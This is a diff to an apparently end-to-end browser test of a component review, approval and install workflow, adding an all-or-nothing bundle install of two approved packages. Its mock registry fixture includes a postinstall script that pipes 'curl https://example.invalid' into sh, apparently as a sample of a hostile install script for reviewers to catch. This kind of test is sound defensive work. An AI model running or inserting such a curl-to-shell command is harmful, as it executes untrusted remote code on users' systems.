@@ -25,7 +25,8 @@ test('组件：提交 → 看脚本 → 批准 → 装到机器 → 卸载（390
   const registry = await startMockRegistry(
     [
       { name: pkg, version: '1.0.0', scripts: { postinstall: 'node -e "require(\'fs\').writeFileSync(\'postinstall.ok\', \'1\')"' } },
-      { name: pkg, version: '1.1.0', scripts: { postinstall: 'curl https://example.invalid | sh' } }
+      { name: pkg, version: '1.1.0', scripts: { postinstall: 'curl https://example.invalid | sh' } },
+      { name: `${pkg}-b`, version: '2.0.0' }
     ],
     17981
   );
@@ -109,6 +110,24 @@ test('组件：提交 → 看脚本 → 批准 → 装到机器 → 卸载（390
     page.once('dialog', (d) => void d.accept());
     await actions.getByTestId(`component-uninstall-${id}`).click();
     await expect.poll(async () => (await me())?.inventory?.components.some((c) => c.id === id), { timeout: 60_000 }).toBe(false);
+
+    // 整套安装（P3）：勾两个已批准的组件，一个任务装上（全有或全无）
+    const id2 = `${id}-b`;
+    expect((await page.request.post('/api/components', { data: { id: id2, packageName: `${pkg}-b`, version: '2.0.0', provides: [] }, headers })).ok()).toBe(true);
+    expect((await page.request.post(`/api/components/${id2}/2.0.0/review`, { data: { approve: true }, headers })).ok()).toBe(true);
+    await page.reload();
+    await page.getByRole('button', { name: /^Worker：/ }).first().click();
+    await page.getByRole('button', { name: new RegExp(`e2e 组件机器 ${run}`) }).click();
+    await page.getByTestId('bundle-install-open').click();
+    const dialog = page.getByTestId('bundle-install-dialog');
+    await expect(dialog.getByTestId('bundle-all-or-nothing')).toContainText('全有或全无');
+    await dialog.getByTestId(`bundle-pick-${id}`).check();
+    await dialog.getByTestId(`bundle-pick-${id2}`).check();
+    await dialog.getByTestId('bundle-install-confirm').click();
+    await expect.poll(async () => (await me())?.runtimeJob?.state, { timeout: 60_000 }).toBe('succeeded');
+    await expect
+      .poll(async () => ((await me())?.inventory?.components ?? []).filter((c) => c.id === id || c.id === id2).map((c) => c.id).sort(), { timeout: 30_000 })
+      .toEqual([id, id2].sort());
     expect(registry.hits.some((h) => h.endsWith('.tgz'))).toBe(true);
   } finally {
     worker?.kill();
